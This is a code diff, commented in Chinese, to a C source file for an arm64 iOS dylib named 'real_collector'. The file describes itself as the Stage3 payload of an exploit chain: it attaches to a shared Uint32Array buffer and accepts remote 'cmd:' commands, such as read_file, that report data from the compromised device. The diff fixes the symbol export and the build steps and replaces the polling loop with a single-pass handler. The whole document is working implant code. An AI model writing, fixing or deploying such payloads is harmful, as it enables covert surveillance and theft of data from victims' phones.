@@ -16,10 +16,14 @@
  *   cmd:read_file:/path
  *   cmd:exit
  *
- * 编译 (必须在 macOS / arm64 工具链):
- *   clang -arch arm64 -shared -Os -o real_collector.dylib \
- *     -Wl,-install_name,@rpath/real_collector.dylib \
+ * 导出符号: process -> Mach-O _process（勿命名为 _process）
+ * 行为: 单次处理即返回（无死循环）
+ *
+ * 编译 (macOS / GitHub Actions macos):
+ *   clang -arch arm64 -shared -Os -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
+ *     -o real_collector.dylib -Wl,-install_name,@rpath/real_collector.dylib \
  *     real_collector.dylib.c
+ *   nm -gU real_collector.dylib | grep process   # 必须看到 _process
  *   cp real_collector.dylib ../payloads/bootstrap.dylib
  */
 
@@ -519,38 +523,30 @@ static void handle_cmd(uint32_t *D, const char *cmd) {
 
 /*
  * Stage3 入口: x0 = shared buffer (Uint32Array backing store)
+ * 函数名必须是 process（Mach-O 导出为 _process）。不要写成 _process（会变成 __process）。
+ * 单次返回，禁止 while(1)，否则 Stage3 kick 永不返回。
  */
-void _process(void *buffer) {
+void process(void *buffer) {
     uint32_t *D = (uint32_t *)buffer;
     uint8_t *payload = payload_ptr(D);
+    uint32_t st;
 
     init_api();
+    st = D[0];
 
-    /* 立即回一条真实“活着”的数据，不依赖任务系统 */
+    if (st == STATE_EXIT)
+        return;
+
+    if (st == STATE_FEED) {
+        if (payload[0] == 'c' && payload[1] == 'm' && payload[2] == 'd' && payload[3] == ':')
+            handle_cmd(D, (const char *)(payload + 4));
+        else
+            respond_ready(D, "{\"ok\":false,\"error\":\"expected_cmd_prefix\"}");
+        return;
+    }
+
+    /* 首次 kick / READY / IDLE：回 boot，证明 collector 在跑 */
     respond_ready(D,
         "{\"ok\":true,\"source\":\"real_collector\",\"event\":\"boot\","
         "\"msg\":\"dylib_started\"}");
-
-    while (1) {
-        uint32_t st = D[0];
-
-        if (st == STATE_EXIT)
-            break;
-
-        if (st == STATE_FEED) {
-            /* cmd:xxx */
-            if (payload[0] == 'c' && payload[1] == 'm' && payload[2] == 'd' && payload[3] == ':') {
-                handle_cmd(D, (const char *)(payload + 4));
-            } else {
-                respond_ready(D, "{\"ok\":false,\"error\":\"expected_cmd_prefix\"}");
-            }
-        }
-
-        if (p_usleep)
-            p_usleep(5000);
-        else {
-            volatile int spin;
-            for (spin = 0; spin < 50000; spin++) {}
-        }
-    }
 }
